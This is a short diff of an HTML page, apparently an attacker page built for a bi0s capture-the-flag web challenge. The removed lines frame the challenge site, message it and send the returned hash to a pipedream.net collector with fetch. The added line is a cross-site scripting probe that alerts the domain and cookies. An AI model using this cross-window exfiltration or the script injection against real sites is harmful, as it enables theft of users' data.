@@ -3,20 +3,6 @@
 </head>
 
 <body>
- <iframe src="http://web.challenge.bi0s.in:5432/demo" id="mahframe2"></iframe>
-
- <form id="mah" action="" method="POST">
- </form>
- <script>
-   var frame2 = document.getElementById("mahframe2");
-   frame2.onload = function() {
-     frame2.contentWindow.postMessage("coucou","*");
-   }
-
-   window.addEventListener("message", (event) => {
-     console.log(event.data);
-     fetch('https://engs0fwjiirqkka.m.pipedream.net/found/'+event.data.Hash);
-   });
- </script>
+ <script>alert(document.domain, document.cookies)</script>
 </body>
 </html>
